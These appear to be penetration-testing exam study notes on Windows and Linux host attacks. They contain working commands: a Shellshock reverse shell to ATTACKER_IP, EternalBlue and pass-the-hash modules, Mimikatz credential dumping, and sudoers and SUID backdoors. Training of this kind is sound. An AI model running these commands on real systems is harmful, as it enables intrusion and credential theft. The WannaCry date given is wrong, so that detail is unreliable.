# 📚 INE — System/Host Based Attacks

## 1. Introduction to System/Host Based Attacks

- **Definition:** Attacks targeted at a specific system or host running a particular OS (Windows or Linux).
- Network services are **not the only attack surface** — individual hosts are equally targeted.
- These attacks typically occur **after gaining initial access** to a network (internal exploitation phase).
- Focus is on exploiting **inherent OS vulnerabilities** and **misconfigurations**.
- Unlike network-based attacks, host-based attacks are more specialized and OS-specific.

> **Prerequisites:** Basic TCP/UDP knowledge, familiarity with Linux & Windows CLI.

---

## 2. Overview of Windows Vulnerabilities

### Why Windows is a Prime Target
- Windows holds **≥70% global market share** (as of 2021) — huge threat surface.
- History of critical vulns: **MS08-067 (Conficker)** → **MS17-010 (EternalBlue)**.
- Most vulnerabilities have **publicly available exploit code**.

### Common Characteristics Across Windows Versions
- Written in **C** → prone to buffer overflows, arbitrary code execution.
- **Not secure by default** — requires proactive hardening.
- **Patch fragmentation** — many systems left unpatched for extended periods.
- Cross-platform vulns also apply (e.g., SQL injection).
- Physical attacks also possible (theft, malicious peripherals).

### Types of Windows Vulnerabilities

| Type | Description |
|---|---|
| Information Disclosure | Exposes confidential data to unauthorized users |
| Buffer Overflow | Data written beyond buffer bounds into adjacent memory |
| Remote Code Execution (RCE) | Attacker executes code on target remotely |
| Privilege Escalation | Attacker elevates from low to high-privilege user |
| Denial of Service (DoS) | Exhausts CPU/RAM/network to disrupt normal operation |

### Frequently Exploited Windows Services

| Service | Port | Purpose |
|---|---|---|
| Microsoft IIS | TCP 80/443 | Windows web server (hosts .asp, .aspx, .php) |
| WebDAV | TCP 80/443 | HTTP extension for file management on web servers |
| SMB/CIFS | TCP 445 | Network file sharing on LAN |
| RDP | TCP 3389 | GUI remote access to Windows |
| WinRM | TCP 5985/5986 | Remote management over HTTP(S) |

---

## 3. Exploiting IIS WebDAV

### What is WebDAV?
- **Web Distributed Authoring and Versioning** — HTTP extension for collaborative file editing on remote web servers.
- Runs on top of IIS on ports **80/443**.
- Requires **username + password** for authentication.

### Attack Methodology
1. **Identify** if WebDAV is running on the IIS server.
2. **Brute-force** credentials using `davtest` or `hydra`.
3. **Authenticate** and **upload a malicious .asp webshell** payload.
4. Execute commands or get a **reverse shell** via the uploaded shell.

### Key Tools

| Tool | Purpose |
|---|---|
| `davtest` | Scan, authenticate, and test file upload capabilities on WebDAV |
| `cadaver` | CLI WebDAV client — upload, download, manage files |

```bash
# Brute-force WebDAV credentials
hydra -l bob -P /usr/share/wordlists/metasploit/unix_passwords.txt TARGET http-get /webdav/

# Test WebDAV with known creds
davtest -auth bob:password123 -url http://TARGET/webdav/

# Connect via cadaver
cadaver http://TARGET/webdav/
# Then: put /usr/share/webshells/asp/webshell.asp
```

> 💡 **Community Exam Tip:** In CTF labs, user "bob" is commonly the weak-password target. Use Hydra against HTTP Basic Auth first. After brute-forcing, use `davtest` to confirm allowed file types, then upload a `.asp` webshell with `cadaver`. Navigate to the webshell in the browser to execute commands and retrieve flags from `C:\`.

### Metasploit Module
```bash
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS <TARGET_IP>
set HttpUsername bob
set HttpPassword password123
exploit
```

---

## 4. Exploiting SMB with PsExec

### SMB Overview
- **Server Message Block** — file/printer sharing protocol on LAN.
- Port **445 (TCP)**; legacy: port 139 over NetBIOS.
- **SAMBA** = Linux open-source implementation of SMB.

### SMB Authentication Types
- **User Authentication** — username + password to access the server.
- **Share Authentication** — password only to access a specific share.
- Both use a **challenge-response** mechanism.

### PsExec Overview
- Lightweight telnet-replacement by Microsoft.
- Authenticates via SMB and runs processes on the remote system.
- Similar to RDP but **command-line only** (no GUI).

### Attack Methodology
1. Brute-force SMB credentials (focus on `Administrator` account).
2. Use `PsExec` or Metasploit's `psexec` module to execute commands remotely.

```bash
# Metasploit SMB login brute-force
use auxiliary/scanner/smb/smb_login
set RHOSTS <TARGET_IP>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run

# PsExec exploitation
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser Administrator
set SMBPass <password>
exploit
```

> 💡 **Community Exam Tip:** Once you have SMB credentials, `smbclient` is extremely useful for browsing shares and downloading flag files directly. Use `smbclient //TARGET/C$ -U administrator` to browse the C drive. The Metasploit psexec module is the primary tool tested in the eJPT for this attack vector.

---

## 5. MS17-010 EternalBlue (SMB)

### What is EternalBlue?
- **CVE-2017-0144 / MS17-010** — targets a flaw in **SMBv1** protocol.
- Originally developed by the **NSA**, leaked by **Shadow Brokers** in 2017.
- Used in the infamous **WannaCry ransomware** attack (June 27, 2017).
- Allows **unauthenticated remote code execution** by sending crafted packets.

### Affected Windows Versions
- Windows Vista, 7, Server 2008, 8.1, Server 2012, 10, Server 2016.

### Tools
- **AutoBlue-MS17-010:** Manual exploit — https://github.com/3ndG4me/AutoBlue-MS17-010
- **Metasploit** has both a scanner (auxiliary) and exploit module.

```bash
# Check if target is vulnerable
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run

# Exploit with Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
exploit
```

> 💡 **Community Exam Tip:** EternalBlue is one of the **most heavily tested exploits** in eJPT. The MSF module is reliable on Windows 7 / Server 2008 targets. It gives you a **SYSTEM-level meterpreter session** — no privilege escalation needed afterwards. Always run the auxiliary scanner first to confirm vulnerability before firing the exploit.

---

## 6. Exploiting RDP

### RDP Overview
- **Remote Desktop Protocol** — proprietary Microsoft protocol for GUI remote access.
- Default port: **TCP 3389**.
- Requires **clear-text** username + password for authentication.

### Attack Methodology
- Perform a brute-force attack to discover valid credentials.
- Use `xfreerdp` or `rdesktop` to connect.

```bash
# Brute-force RDP with Hydra
hydra -L users.txt -P passwords.txt rdp://<TARGET_IP>

# Connect via xfreerdp
xfreerdp /u:administrator /p:<password> /v:<TARGET_IP>:3389
```

> 💡 **Community Exam Tip:** During the eJPT exam, `xfreerdp` is the go-to RDP client on Kali. Try logging in with **every username/password pair** you find via brute-force, as flags are often on user desktops or in specific directories accessible only after GUI login.

---

## 7. CVE-2019-0708 BlueKeep (RDP)

### What is BlueKeep?
- **CVE-2019-0708** — unauthenticated RCE via a flaw in the Windows **RDP protocol**.
- Allows attacker to access **kernel memory chunks** and execute code at **SYSTEM level**, without credentials.
- Made public by Microsoft: **May 14, 2019**. ~1 million systems were vulnerable at discovery.

### Affected Versions
- Windows XP, Vista, 7, Server 2008 & R2.

### Metasploit Usage
```bash
# Scanner
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <TARGET_IP>
run

# Exploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <TARGET_IP>
show targets         # Must pick correct target architecture
set target <N>
exploit
```

> ⚠️ **Warning:** Targeting kernel memory can cause **system crashes** (BSOD). Use carefully in lab environments. Only use verified MSF modules — many public PoCs are malicious.

---

## 8. Exploiting WinRM

### WinRM Overview
- **Windows Remote Management** — Microsoft's remote management protocol over HTTP(S).
- Ports: **TCP 5985** (HTTP) / **5986** (HTTPS).
- Used by sysadmins for remote command execution and system management.

### Attack Tools

| Tool | Purpose |
|---|---|
| `crackmapexec` | Brute-force WinRM credentials and execute remote commands |
| `evil-winrm` | Ruby-based tool to obtain an interactive shell over WinRM |

```bash
# Brute-force WinRM
crackmapexec winrm <TARGET_IP> -u administrator -p passwords.txt

# Get a shell with evil-winrm
evil-winrm -i <TARGET_IP> -u administrator -p '<password>'
```

> 💡 **Community Exam Tip:** If port 5985 is open, always try WinRM. `evil-winrm` gives a clean shell that feels very similar to a PowerShell session. CrackMapExec is great for testing multiple credentials quickly.

---

## 9. Windows Kernel Exploits & Privilege Escalation

### Understanding the Windows Kernel
- **Windows NT Kernel** — ships with all Windows versions.
- Two modes:
  - **User Mode** — restricted access to resources.
  - **Kernel Mode** — unrestricted access; manages devices and memory.

### Privilege Escalation Concept
- Process of moving from a low-privilege account to **Administrator/SYSTEM**.
- Critical step in the attack lifecycle — determines overall test success.

### Methodology
1. Identify kernel version with `systeminfo`.
2. Run **Windows-Exploit-Suggester** against the output.
3. Download, compile, and transfer relevant kernel exploit to the target.
4. Execute the exploit to gain elevated privileges.

```bash
# Get system info (from meterpreter shell)
shell
systeminfo > sysinfo.txt
exit

# Run exploit suggester locally
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database 2024-xx-xx-mssb.xls --systeminfo sysinfo.txt

# From meterpreter — try getsystem first
getsystem

# Use local exploit suggester in MSF
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

### Tools
- **Windows-Exploit-Suggester:** https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- **Windows-Kernel-Exploits:** https://github.com/SecWiki/windows-kernel-exploits

> 💡 **Community Exam Tip:** Always try `getsystem` in meterpreter first — it often succeeds without a separate exploit. If it fails, use `local_exploit_suggester` to find kernel-level escalation paths. The `ms16_014_wmi_recv_notif` module is noted to work on Windows 7 SP1.

---

## 10. Bypassing UAC with UACMe

### What is UAC?
- **User Account Control** — Windows Vista+ security feature requiring approval for elevated actions.
- Non-admin users see a **credential prompt**; admin users see a **consent prompt**.
- UAC has integrity levels from **Low to High**.
- If UAC level is **below High**, programs can run elevated without prompting.

### UACMe Tool
- Open-source UAC bypass tool by **@hfire0x**.
- GitHub: https://github.com/hfiref0x/UACME
- **60+ exploit methods** covering Windows 7 through Windows 10.
- Abuses the built-in **Windows AutoElevate** mechanism.

### Requirements
- The compromised account must be a member of the **local Administrators group**.

> 💡 **Community Exam Tip:** UAC bypass is needed when you have an administrator account but still can't perform SYSTEM-level operations. UACMe method numbers vary by Windows version — check the GitHub documentation for the right method number before executing.

---

## 11. Access Token Impersonation

### Windows Access Tokens — Overview
- Created by **LSASS (Local Security Authority Subsystem Service)** upon successful authentication.
- Generated by `winlogon.exe` and attached to `userinit.exe`; all child processes inherit the token.
- Functions like a **web cookie** — grants access without re-authenticating.

### Token Types

| Type | Created By | Scope |
|---|---|---|
| **Impersonate-level** | Non-interactive login (service/domain logon) | Local system only |
| **Delegate-level** | Interactive login / RDP | Any system (highest threat) |

### Required Privileges for Token Impersonation

| Privilege | Description |
|---|---|
| `SeAssignPrimaryToken` | Impersonate tokens |
| `SeCreateToken` | Create arbitrary tokens with admin rights |
| `SeImpersonatePrivilege` | Create process under another user's security context |

### Incognito Module (Meterpreter)
```bash
# In meterpreter session
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"
getuid       # Confirm new identity
```

> 💡 **Community Exam Tip:** After getting a meterpreter session, always run `getprivs` to list privileges. If `SeImpersonatePrivilege` is present, token impersonation is viable. The `incognito` module is built into meterpreter — no separate upload needed. Impersonating the Administrator delegate token is a fast path to SYSTEM.

---

## 12. Alternate Data Streams (ADS)

### What is ADS?
- **NTFS file attribute** originally for MacOS HFS compatibility.
- Every NTFS file has two streams:
  - **Data stream** — actual file content (default, visible).
  - **Resource stream** — metadata (hidden, attackers abuse this).

### Attacker Use Case
- Hide **malicious payloads or executables** inside the metadata of legitimate files.
- File appears as **0 bytes** to casual inspection.
- Evades **basic signature-based AV** and static scanning tools.

```cmd
# Hide payload in ADS of a legitimate file (CMD - requires admin)
type payload.exe > C:\Temp\windowslog.txt:payload.exe

# Create a symlink to execute the hidden payload
cd C:\Windows\System32
mklink winlog.exe C:\Temp\windowslog.txt:payload.exe
```

> 💡 **Community Exam Tip:** ADS is tested conceptually in the eJPT — understand how to create and execute files hidden in alternate streams. In practice, use the `mklink` approach to create an executable shortcut to the hidden stream payload. This is also a key **detection evasion** concept for post-exploitation.

---

## 13. Windows Password Hashes & Credential Dumping

### Where Are Passwords Stored?
- **SAM (Security Accounts Manager)** database stores all hashed user passwords locally.
- **SAM file is locked** while the OS is running — cannot be copied directly.
- Authentication is managed by **LSA (Local Security Authority)**.
- In modern Windows, SAM is encrypted with a **syskey**.
- Attackers dump hashes from the **LSASS process in-memory**.
- **Elevated/Admin privileges required** to access LSASS.

### LM Hash (Legacy — pre-Windows Vista)
- Default hashing algorithm prior to Windows NT4.0.
- **Weaknesses:**
  - Password split into **two 7-character chunks**, each hashed separately with DES.
  - All characters **converted to uppercase** (no case sensitivity).
  - **No salt** — vulnerable to rainbow table and brute-force attacks.

### NTLM Hash (Current — Windows Vista+)
- Windows Vista+ disables LM and uses **NTLM exclusively**.
- Password encrypted with **MD4** algorithm; original password discarded.
- **Improvements over LM:**
  - Not split into chunks.
  - **Case sensitive**.
  - Supports **symbols and Unicode**.

---

## 14. Searching for Passwords in Config Files

### Unattended Windows Setup
- Used for **automated mass deployment** of Windows across multiple systems.
- Config files contain system settings and **Administrator account credentials**.
- If left on the system post-installation, they become a **credential goldmine**.

### Files to Check

| Path | File |
|---|---|
| `C:\Windows\Panther\` | `Unattend.xml` |
| `C:\Windows\Panther\` | `Autounattend.xml` |

- Passwords may be **Base64-encoded** — always decode them.

```bash
# In meterpreter or shell
search -f Unattend.xml
type C:\Windows\Panther\Unattend.xml

# Decode base64 password (Linux)
echo "<base64string>" | base64 -d
```

> 💡 **Community Exam Tip:** Always check these config files early in post-exploitation. They are a quick win for credentials that can be reused for lateral movement or privilege escalation. Don't forget to decode the Base64-encoded password before using it.

---

## 15. Dumping Hashes with Mimikatz

### What is Mimikatz?
- Post-exploitation tool by **Benjamin Delpy (@gentilkiwi)**.
- Extracts **clear-text passwords, NTLM hashes, and Kerberos tickets** from memory.
- Targets the **lsass.exe** process where credentials are cached.
- **Requires elevated (Admin) privileges**.

### Using Mimikatz (Standalone)
```bash
# Upload mimikatz to target (from meterpreter)
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\Temp\\

shell
cd C:\Temp
mimikatz.exe

# Inside mimikatz
privilege::debug          # Enable debug rights
lsadump::sam              # Dump SAM database hashes
lsadump::secrets          # Dump LSA secrets
sekurlsa::logonPasswords  # Extract clear-text passwords from LSASS
```

### Using Kiwi (Meterpreter Extension)
```bash
# In meterpreter
load kiwi
creds_all          # Dump all credentials
lsa_dump_sam       # SAM hashes
lsa_dump_secrets   # LSA secrets
```

> 💡 **Community Exam Tip:** `load kiwi` in meterpreter is the fastest way to dump hashes — no upload required. Save all hash output to a text file immediately. The format is `LM:NTLM` — you need the **NTLM portion** for Pass-the-Hash attacks. Always run `privilege::debug` in standalone mimikatz before any dump commands or they will fail.

---

## 16. Pass-The-Hash Attacks

### Concept
- Capture **NTLM hashes** (not the cleartext password) and use them directly for authentication.
- Exploits the challenge-response authentication design — the hash **is** the secret.
- Avoids needing to crack the password.

### Tools for PTH

| Tool | Method |
|---|---|
| Metasploit `psexec` module | Pass hash via SMB to get meterpreter session |
| `crackmapexec` | Test and execute commands using hash |

```bash
# Metasploit PsExec PTH
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser Administrator
set SMBPass <LM_HASH>:<NTLM_HASH>     # Format: aad3b435...:31d6cfe0...
set payload windows/x64/meterpreter/reverse_tcp
exploit

# CrackMapExec PTH
crackmapexec smb <TARGET_IP> -u Administrator -H "<NTLM_HASH>" -x "whoami"
```

> 💡 **Community Exam Tip:** PTH is a **core eJPT technique** — expect it on the exam. You don't need the cleartext password; just the NTLM hash from `hashdump` or Kiwi. The Metasploit psexec module's `SMBPass` field accepts the full `LM:NTLM` hash string directly. Administrative privileges are required on the target for this to work.

---

## 17. Linux Services — Overview

### Linux Context
- Linux is **free, open-source**, and primarily deployed as a **server OS**.
- Based on the **Linux kernel** (Linus Torvalds) + **GNU toolkit** (Richard Stallman).
- Multiple users can access simultaneously — multiple attack vectors.

### Frequently Exploited Linux Services

| Service | Port | Notes |
|---|---|---|
| Apache Web Server | TCP 80/443 | Powers >80% of web servers globally |
| SSH | TCP 22 | Encrypted remote access; successor to Telnet |
| FTP | TCP 21 | File transfer; sometimes allows anonymous access |
| SAMBA | TCP 445 | Linux SMB — shares files with Windows systems |

---

## 18. Shellshock (CVE-2014-6271)

### What is Shellshock?
- Family of vulnerabilities in **Bash shell (since v1.3)** — discovered Sept 12, 2014.
- Allows **remote arbitrary command execution** via Bash.
- Triggered by a flaw where Bash **executes trailing commands** after the character sequence `() {:;};`.
- **Linux-only** — Windows does not use Bash.

### Exploitation Context
- Vulnerable when Apache is configured to run **CGI scripts** (`.cgi`, `.sh`).
- Each CGI request spawns a new Bash process → triggers the vulnerability.
- Exploit can be done **manually or via Metasploit**.

```bash
# Manual exploitation via HTTP header
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' http://TARGET/cgi-bin/vulnerable.cgi

# Metasploit module
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <TARGET_IP>
set TARGETURI /cgi-bin/vulnerable.cgi
set payload linux/x86/meterpreter/reverse_tcp
exploit
```

> 💡 **Community Exam Tip:** In CTF labs, look for `.cgi` or `browser.cgi` files accessible via the Apache web server. Check the `/opt/apache/htdocs/` directory for hidden files. The MSF module is the most reliable method for exploitation on the eJPT.

---

## 19. Exploiting FTP, SSH, SAMBA

### FTP (Port 21)
- Used for file sharing between server and clients.
- Often configured to allow **anonymous access** — always test first!
- Otherwise, brute-force with `hydra`.

```bash
# Test anonymous login
ftp <TARGET_IP>     # Username: anonymous, Password: (empty or email)

# Brute-force FTP
hydra -L users.txt -P passwords.txt ftp://<TARGET_IP>
```

### SSH (Port 22)
- Encrypted remote access protocol.
- Authentication modes: **username+password** OR **key-based**.
- Brute-force the password if key-based auth is not enforced.

```bash
# Brute-force SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>

# Connect
ssh user@<TARGET_IP>
```

### SAMBA (Port 445)
- Linux SMB implementation — file/device sharing with Windows systems.
- Brute-force credentials, then enumerate shares with **SMBMap** or **smbclient**.

```bash
# Enumerate shares (no auth / null session)
smbclient -L //<TARGET_IP> -N
enum4linux -a <TARGET_IP>

# Brute-force SAMBA credentials
use auxiliary/scanner/smb/smb_login
set RHOSTS <TARGET_IP>
run

# Connect and download files
smbclient //<TARGET_IP>/share -U username
smb: \> get flag.txt

# SMBMap enumeration
smbmap -H <TARGET_IP> -u username -p password
```

> 💡 **Community Exam Tip:** Always check for **null sessions** on SAMBA — `smbclient -L //IP -N` and `enum4linux -a IP`. These can reveal usernames and share names without credentials. For the eJPT exam, SMB enumeration and exploitation via brute-force is heavily weighted.

---

## 20. Linux Kernel Exploits

### Methodology
1. Identify Linux kernel version: `uname -r` and `uname -a`.
2. Run **Linux-Exploit-Suggester** to find applicable kernel exploits.
3. Download, compile, and transfer exploit to target.
4. Execute to gain **root shell**.

```bash
# Get kernel version
uname -r
cat /etc/issue
cat /etc/*release

# Linux Exploit Suggester (run on target)
./linux-exploit-suggester.sh

# Or from meterpreter
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run

# Example: Dirty Cow (CVE-2016-5195)
searchsploit dirty cow
searchsploit -m 40839
gcc -pthread 40839.c -o dirtycow -lcrypt
./dirtycow
```

### Tool
- **Linux-Exploit-Suggester:** https://github.com/mzet-/linux-exploit-suggester

> 💡 **Community Exam Tip:** Focus more on **Linux privilege escalation** than Windows — it's more heavily tested on the eJPT exam. Dirty Cow and `chkrootkit` local privilege escalation are well-known examples. The chkrootkit exploit (`exploit/unix/local/chkrootkit`) via Metasploit is particularly relevant — check if the process is running with `ps aux`.

---

## 21. Exploiting Misconfigured Cron Jobs

### What are Cron Jobs?
- Linux task scheduler — **Cron** runs scripts/commands on a set schedule.
- Configuration stored in **crontab** file.
- Cron jobs run as the **user who created them** — root-owned crons run as root.

### Attack Methodology
1. List all cron jobs: `cat /etc/crontab` and `crontab -l`.
2. Find cron jobs **run by root** that reference editable scripts/files.
3. **Modify the referenced script** to add a privilege escalation payload.
4. Wait for the cron job to trigger and get root shell.

```bash
# View all cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Find script referenced by a root cron job, then inject payload
# If root cron runs /usr/local/share/copy.sh and we can edit it:
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh

# Wait for cron to execute, then:
sudo su
```

> 💡 **Community Exam Tip:** This is one of the **most common Linux privesc paths** in eJPT labs. Look for writable scripts called by root crontab entries. Also check if file paths in cron jobs are **relative** (PATH hijacking possible). Adding a backdoor user or sudoers entry via a writable script is the cleanest approach.

---

## 22. Exploiting SUID Binaries

### What is SUID?
- **Set Owner User ID** — special Linux file permission.
- When applied, the binary **runs with the file owner's permissions**, not the caller's.
- Typically used to give regular users access to specific root-owned operations.
- **Misconfigured SUID binaries** owned by root can be exploited to gain root access.

### Attack Methodology
1. Find all SUID binaries owned by root.
2. Identify exploitable binaries (custom/unusual ones are most promising).
3. Exploit the binary to spawn a root shell.

```bash
# Find all SUID binaries
find / -type f -perm /4000 2>/dev/null
find / -type f -perm -u=s 2>/dev/null

# GTFOBins — reference for exploiting known SUID binaries
# https://gtfobins.github.io/
```

### Classic Example (CTF Lab Pattern)
```bash
# A binary "welcome" runs "greetings" — both owned by root
# "welcome" has SUID set, "greetings" is in writable dir
ls -la
# -rwsr-xr-x 1 root root  welcome
# -rwx------ 1 root root  greetings

# Delete "greetings" and replace with malicious shell script
rm greetings
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > greetings
chmod +x greetings

# Execute "welcome" — it calls our fake "greetings"
./welcome

# Execute the SUID bash copy as root
/tmp/bash -p
```

> 💡 **Community Exam Tip (from CTF writeups):** The `welcome`/`greetings` binary chain is a **real pattern in eJPT CTF labs**. Use `strings ./welcome` to understand what another binary or script it calls, then replace that dependency with your malicious version. Use `find / -type f -perm /4000 2>/dev/null` to locate all SUID binaries immediately after gaining shell access.

---

## 23. Dumping Linux Password Hashes

### Where Are Credentials Stored?

| File | Path | Access |
|---|---|---|
| `/etc/passwd` | User account info | **Readable by all users** |
| `/etc/shadow` | Hashed passwords | **Root only** |

- Passwords in `/etc/passwd` are encrypted — replaced by `x` (actual hash in shadow).
- `/etc/shadow` stores the hash + salt + aging info.

### Identifying the Hashing Algorithm
The number after the `$` in the shadow file reveals the algorithm:

| Value | Algorithm |
|---|---|
| `$1` | MD5 |
| `$2` | Blowfish |
| `$5` | SHA-256 |
| `$6` | SHA-512 |

### Dumping Hashes
```bash
# From root shell
cat /etc/shadow

# From meterpreter (after privilege escalation)
use post/linux/gather/hashdump
set SESSION <id>
run

# Crack with John the Ripper
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack with Hashcat
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt  # SHA-512
```

> 💡 **Community Exam Tip:** Always dump `/etc/shadow` after escalating to root — credentials found here can be used for lateral movement to other systems. `$6` (SHA-512) is the most common modern hash. Note that the `/etc/shadow` file itself being readable without root is a serious misconfiguration and an instant privesc indicator.

---

## 🔑 Key Tools Summary

| Tool | Platform | Use Case |
|---|---|---|
| `nmap` | Both | Port scanning & service enumeration |
| `hydra` | Both | Brute-force logins (HTTP, FTP, SSH, RDP, SMB) |
| `metasploit (msfconsole)` | Both | Exploitation framework |
| `davtest` | Windows | WebDAV capability testing |
| `cadaver` | Windows | WebDAV file upload/management |
| `crackmapexec` | Windows | SMB/WinRM credential testing & command exec |
| `evil-winrm` | Windows | Interactive shell over WinRM |
| `mimikatz` | Windows | Credential/hash extraction |
| `incognito (meterpreter)` | Windows | Token impersonation |
| `UACMe` | Windows | UAC bypass |
| `Windows-Exploit-Suggester` | Windows | Kernel vuln identification |
| `smbclient` | Both | SMB share enumeration and file access |
| `smbmap` | Both | SMB share enumeration with permissions |
| `enum4linux` | Linux | Full SMB/SAMBA enumeration |
| `linux-exploit-suggester` | Linux | Kernel vuln identification |
| `xfreerdp` | Windows | RDP client |

---

## 🎯 Exam Tips from the Community (eJPT)

> Sourced from eJPT exam takers across Medium, Reddit, and GitHub cheat sheets (2024–2025).

- **Note-taking is everything.** Use Obsidian, CherryTree, or OneNote. Screenshot every step. Structure your notes by attack category — you'll save enormous time during the exam.
- **Build your own cheat sheet.** Don't rely on memorizing Hydra/Metasploit syntax. Write it all down before exam day. You won't remember it when you're 4 hours deep under stress.
- **Run Nmap first and save output.** Start with `nmap -sV -sC -O <TARGET>` and pipe to XML (`-oX`). Import into Metasploit with `db_import` for organized tracking. Note every open port, service, and version.
- **EternalBlue is a must-know.** MS17-010 reliably gives SYSTEM on unpatched Windows 7/2008 targets — know the MSF module cold. Run the auxiliary scanner first before firing the exploit.
- **Mimikatz / Kiwi for hashes, then PTH.** Standard post-exploitation flow: get shell → load kiwi → `creds_all` → save hashes → use psexec module with hash for lateral movement.
- **SMB brute-force is heavily tested.** Know the `smb_login` auxiliary module and how to set wordlist paths. Try `Administrator` as the username first.
- **Focus more on Linux privesc** than Windows — exam takers report it is tested more heavily. Cron jobs and SUID binaries are the most common paths.
- **SUID binary exploitation pattern:** `find / -type f -perm /4000 2>/dev/null` → check for custom/unusual binaries → use `strings` to see what they call → replace the dependency with a malicious script.
- **For cron jobs:** `cat /etc/crontab` immediately after gaining a shell. Look for writable scripts or paths owned by root.
- **WebDAV CTF flow:** Hydra → `davtest` → `cadaver` → upload `.asp` webshell → browse in browser → `dir C:\` → `type C:\flag.txt`.
- **Don't skip any module.** Every demo and lab in the course maps to something on the exam. The content is very focused and directly tested.
- **Use `xfreerdp` for all RDP connections** and try every set of credentials you've found — flags are frequently on the desktop or in specific directories.
- **After getting shell, always run:** `getuid`, `getprivs`, `sysinfo`, `ifconfig` — record everything. Look for additional network interfaces that may indicate pivot targets.
- **The exam is 48 hours** — you have more than enough time. Slow down, be methodical, and document as you go.

---

*Notes compiled from the INE Penetration Testing Student course (System/Host Based Attacks module) by Alexis Ahmed, supplemented with community exam experiences from eJPT exam takers (2024–2025).*